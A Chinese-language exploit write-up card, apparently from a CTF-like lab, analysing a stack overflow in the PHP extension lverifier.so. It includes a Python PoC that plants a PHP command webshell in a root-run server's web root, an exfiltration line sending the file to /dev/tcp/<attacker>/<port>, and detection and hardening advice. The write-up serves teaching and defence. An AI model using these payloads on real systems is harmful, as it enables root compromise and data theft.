---
id: binary-pwn-stack-php-extension-lverifier-username-overflow-root-webshell
title: PHP 扩展 lverifier.so 用户名栈溢出：固定 800 拷贝 + SHORT_USERNAME_LEN 16 位截断，写入 root docroot 的 PHP WebShell
type: scenario
domain: binary
path: binary/pwn/stack
technique: php-extension-lverifier-username-stack-overflow-root-webshell
tags:
- binary
- pwn
- stack-overflow
- php-extension
- zend-parse-parameters
- integer-truncation
- privilege-escalation
- linux
- ctf-like
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V311
  verified_at: '2026-11-08T12:35:40+08:00'
  notes: 已对照 maps 图32、IDA 图33-39 与 root webshell 图40 核对：zif_say_lverifier/zend_parse_parameters、800<LEN 时固定 100 qword 复制、SHORT_USERNAME_LEN 的 (short)(LEN+10) 公式、root 服务配置与 xtz.php uid=0 结果一致。PoC 为原文经验性构造，未给出精确覆盖偏移/落盘调用，未复现。
url: /docs/binary/pwn/stack/binary-pwn-stack-php-extension-lverifier-username-overflow-root-webshell/
draft: false
kb_aliases:
- lverifier.so 栈溢出
- PHP 扩展 pwn
- say_lverifier
- validating_userinput
- SHORT_USERNAME_LEN 截断
- root PHP 内置服务器
- xtz.php
---

## 一句话结论

目标以 root 运行 PHP 内置服务器并加载自定义扩展 `lverifier.so`；扩展导出 `say_lverifier`，经 `zend_parse_parameters` 取 username/password 后调用 `validating_userinput`，其中 `strlen` 得到长度后一方面以固定 100 个 qword（800 字节）把用户名复制到栈缓冲区，另一方面把 `(short)(LEN_USERNAME + 10)` 截断后计算 `SHORT_USERNAME_LEN` 并据此在栈上搬运数据；提交约 65535 字节、内含目标文件路径与 `<?php system($_REQUEST['cmd']); ?>` 的用户名即可触发栈破坏，使扩展把内容写到 Web 根下的 `xtz.php`，访问后以 `uid=0(root)` 执行命令。

## 原理

- **扩展入口**：`zif_say_lverifier` 是 PHP 的 C 扩展函数（`PHP_FUNCTION(say_lverifier)` 编译后的符号），反编译可见它调用 `zend_parse_parameters(..., &USERNAME, &PASSWORD)` 取两个字符串，再调用 `validating_userinput(USERNAME, PASSWORD)`，最后按返回值设置 `return_value`。PHP 层对 username 长度没有上限，字符串可包含任意字节。
- **固定 800 字节复制**：`validating_userinput` 先 `LEN_USERNAME = strlen(USERNAME)`；当 `800 < LEN_USERNAME` 时，循环 100 次、每次复制 8 字节，把用户名前 800 字节复制到 `USERNAME_COPY`（栈上 `auStack_360 + 3` 附近）。这个分支用常量 800 而不是实际长度，后续逻辑却仍按 `LEN_USERNAME` 计算布局，形成不一致。
- **16 位截断**：`SHORT_USERNAME_LEN = -((long)(short)((short)LEN_USERNAME + 10) + 0xfU & 0xfffffffffffffff0);` 把 `LEN_USERNAME + 10` 先转成 `short`（16 位）再参与取整/取负。对 65535 这类长度，`(short)(65535+10)` 发生回绕，`SHORT_USERNAME_LEN` 变成一个很小的值（原文截图公式处标注为关键点 4），随后用它对 `LOG_PATH`/`USERNAME_COPY` 做栈上复制，越界写入相邻栈变量/返回地址。
- **日志路径与落盘**：扩展在栈上拼出 `/var/log/lverifier...` 之类的 `LOG_PATH`、`LOG_DATA`（`session=1:user=root:version=beta:type=testing`），并调用 `printf`/`event_recorder`/`load_users`。原文/GPT 分析指出 `USERNAME_COPY` 复制缺少长度检查、`SHORT_USERNAME_LEN` 可能整数溢出；具体哪一个 `memcpy`/循环最终覆盖了文件路径或函数指针，原文没有给出精确偏移，PoC 是经验性的。
- **为什么能得到 root**：该 PHP 内置服务器由 systemd 服务 `start__pph.service` 以 `User=root` 启动，`WorkingDirectory=/development/server-management_system_id_0`，`ExecStart=/usr/bin/php -S 127.0.0.1:9999`；扩展运行在 root 进程里。溢出后扩展把用户名中的路径 `/development/server-management_system_id_0/xtz.php` 与 PHP 代码写入该目录，Web 服务器以 root 身份执行 `xtz.php`，`id` 返回 `uid=0(root)`。
- **PoC 构造**：用户名总长约 65535 字节：前 16 个 `A`，用 `/` 填充到 128 字节边界，再拼接目标路径（`.../xtz.php\n`）与 `<?php system($_REQUEST['cmd']); ?>`，最后用 `X` 填满到 65535。原文强调文件名与内容要唯一，避免覆盖已有文件/命中缓存。

## 触发条件

- 目标加载了存在该缺陷的自定义 PHP 扩展（本例 `lverifier.so`），且 `say_lverifier` 可从 Web 请求到达（登录/验证接口）。
- PHP 进程以高权限（本例 root）运行，且 Web 根/工作目录对它可写。
- 攻击者能提交约 64KB 的 username（HTTP 参数/表单未被长度限制）。
- 扩展未启用栈保护/无法阻止溢出，或溢出路径可稳定命中；目标 PHP/扩展版本与原文一致时最可靠。

## 利用步骤

1. **发现扩展**：从 `index.php`/`main.js` 看到 `say_lverifier` 未在 PHP 中定义；在 `/development/server-management_system_id_0/.debug` 的 maps 中看到 `/usr/lib/php/20220829/lverifier.so`（image 32）。
2. **取样本**：用 `cat /usr/lib/php/20220829/lverifier.so > /dev/tcp/<attacker>/<port>` 与 `nc -lnvp <port> > lverifier.so` 把 `.so` 传出（image 33 前后）。
3. **逆向**：`strings`/IDA 查看导出 `say_lverifier`、`zif_say_lverifier`；反编译 `validating_userinput`，确认 `strlen`、800 字节固定复制、`SHORT_USERNAME_LEN` 的 short 截断与 `LOG_PATH` 拼接。
4. **构造 payload**：按原文脚本生成 65535 字节用户名，内含目标路径与 PHP 代码；确保文件名/内容唯一。
5. **提交**：通过登录/验证接口提交 username（password 任意），触发 `validating_userinput`。
6. **验证**：访问 `http://127.0.0.1:9999/xtz.php?cmd=id`，返回 `uid=0(root)` 即成功（image 40）。
7. **留证**：保存 `.so`、payload、服务配置（`start__pph.service`）与命令输出。

## PoC

```python
xzt = "A" * 16
longae = "/development/server-management_system_id_0/xtz.php\n"
xzt += "/" * (128 - len(xzt) - len(longae))
xzt += longae
content = "<?php system($_REQUEST['cmd']); ?>"
xzt += content
xzt += "X" * (65535 - len(xzt))
print(xzt)
```

说明：原文强调“文件名不重复，内容不重复写入”；实际提交时需把该字符串作为 username 参数（URL 编码/表单）发送到 `say_lverifier` 所在接口。原文未给出覆盖偏移与精确落盘调用，PoC 为经验性构造；不同 PHP/扩展版本需要重新调试（gdb/核心转储）确认 `SHORT_USERNAME_LEN` 回绕后的栈布局。

漏洞片段（反编译要点，原文）：

```c
LEN_USERNAME = strlen(USERNAME);
SHORT_USERNAME_LEN = -((long)(short)((short)LEN_USERNAME + 10) + 0xfU
                       & 0xfffffffffffffff0);
...
if (800 < LEN_USERNAME) {
    for (i = 100; i != 0; i--) { *copy++ = *USERNAME++; }  // 固定 800 字节
}
...
load_users((long)&LOG_PATH + SHORT_USERNAME_LEN, PASSWORD);
```

## 变体与关联

- **通用 PHP 扩展溢出**：同类问题见 [[ctf-pwn-php-extension-minclude-stack-overflow-maps-rop]]（`memcpy` 无长度限制 + `/proc/self/maps` 泄露 + ROP）；本卡的差异是固定 800 拷贝 + 16 位长度截断，且目标是本地 root PHP 服务。
- **其他扩展入口**：`zend_parse_parameters` 的 `"s"` 参数可接收二进制字符串；任何未做长度检查的 `memcpy`/`strcpy`/循环复制都可能成为 sink。
- **利用结果变化**：可写 Web 根时可写 WebShell；若目标是 CLI/FPM，可利用 ROP/ret2libc 反弹 shell；栈保护开启时需先泄露 canary（`/proc/self/maps`、格式化字符串等）。
- 关联：[[code-analysis-dynamic-debugging-php-extension-apache-gdbserver-zif-symbols]]（PHP 扩展调试与 `zif_` 符号恢复）。

## 检测与防御

- **架构**：不要以 root 运行 PHP 内置服务器/应用；使用低权限用户 + 最小文件权限；Web 根不可写。
- **代码审计**：自定义 PHP 扩展中所有 `zend_parse_parameters` 字符串参数都要按 `size_t` 校验长度；复制到固定缓冲区前检查目标容量；避免 `short`/`int` 截断参与长度计算；启用 `-fstack-protector-strong`、`FORTIFY_SOURCE`。
- **检测**：登录/验证接口出现约 64KB 的 username、包含 `/development/...php` 或 `<?php` 的请求；Web 根出现陌生 PHP 文件；PHP 进程崩溃/核心转储；`/var/log/lverifier*` 异常写入。
- **响应**：删除 WebShell、回滚扩展/服务配置，排查同进程的其他文件写入与 root 命令执行痕迹。
